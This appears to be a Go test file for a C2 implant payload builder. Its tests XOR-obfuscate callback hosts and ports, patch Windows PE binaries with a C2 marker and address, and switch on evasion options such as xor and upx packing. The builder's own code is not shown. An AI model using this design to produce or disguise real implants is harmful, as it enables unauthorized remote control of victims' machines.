package payload

import (
	"bytes"
	"context"
	"errors"
	"testing"
	"time"
)

func TestXorDefaultHostPort(t *testing.T) {
	host := xorEncode("10.211.55.2", xorKey)
	port := xorEncode("34567", xorKey)
	if cArray(host) != "0x6b, 0x6a, 0x74, 0x68, 0x6b, 0x6b, 0x74, 0x6f, 0x6f, 0x74, 0x68, 0x00" {
		t.Fatalf("host %s", cArray(host))
	}
	if cArray(port) != "0x69, 0x6e, 0x6f, 0x6c, 0x6d, 0x00" {
		t.Fatalf("port %s", cArray(port))
	}
}

func TestValidate(t *testing.T) {
	ok, err := Validate(Request{Host: "10.0.0.8", Port: 34567, Filename: "client"})
	if err != nil {
		t.Fatal(err)
	}
	if ok.Filename != "client.exe" || ok.Host != "10.0.0.8" {
		t.Fatalf("%+v", ok)
	}
	if _, err := Validate(Request{Host: "c2.example.com", Port: 34567, Filename: "a.exe"}); err != nil {
		t.Fatal(err)
	}
	cases := []Request{
		{Host: "0.0.0.0", Port: 1},
		{Host: "224.0.0.1", Port: 1},
		{Host: "10.0.0.1", Port: 0},
		{Host: "10.0.0.1", Port: 1, Filename: "../x.exe"},
	}
	for _, c := range cases {
		if _, err := Validate(c); !errors.Is(err, ErrInvalid) {
			t.Fatalf("want invalid for %+v, got %v", c, err)
		}
	}
}

func TestPatchBinary(t *testing.T) {
	res, err := Build(context.Background(), Request{Host: "192.168.1.20", Port: 4444, Filename: "t.exe", Target: "windows-x64", Language: "c", Techniques: []string{"xor", "gui"}})
	if err != nil {
		t.Fatal(err)
	}
	if res.Bytes[0] != 'M' || res.Bytes[1] != 'Z' {
		t.Fatalf("not pe")
	}
	if bytes.Index(res.Bytes, []byte("C2PATCH!")) < 0 {
		t.Fatal("magic missing")
	}
	plain, err := Build(context.Background(), Request{Host: "10.0.0.9", Port: 2222, Filename: "p.exe", Target: "windows-x64", Language: "c", Techniques: []string{"gui"}})
	if err != nil {
		t.Fatal(err)
	}
	if bytes.Index(plain.Bytes, []byte("10.0.0.9")) < 0 {
		t.Fatal("xor off should write plaintext host")
	}
}

func TestValidateLanguage(t *testing.T) {
	if _, err := Validate(Request{Host: "10.0.0.8", Port: 34567, Target: "linux-amd64", Language: "c"}); !errors.Is(err, ErrInvalid) {
		t.Fatalf("c on linux: %v", err)
	}
	ok, err := Validate(Request{Host: "10.0.0.8", Port: 34567, Filename: "t.exe", Target: "windows-x64", Language: "c", Techniques: []string{"upx"}})
	if err != nil {
		t.Fatal(err)
	}
	if ok.Language != "c" || !ok.Has("upx") || ok.Has("xor") {
		t.Fatalf("%+v", ok)
	}
}

func TestBuildPE(t *testing.T) {
	if _, err := Compiler(); err != nil {
		t.Skip("mingw not installed")
	}
	ctx, cancel := context.WithTimeout(context.Background(), 45*time.Second)
	defer cancel()
	res, err := Build(ctx, Request{Host: "127.0.0.1", Port: 34567, Filename: "t.exe"})
	if err != nil {
		t.Fatal(err)
	}
	if res.Filename != "t.exe" || len(res.Bytes) < 1024 || res.Bytes[0] != 'M' || res.Bytes[1] != 'Z' {
		t.Fatalf("bad pe name=%s len=%d", res.Filename, len(res.Bytes))
	}
}
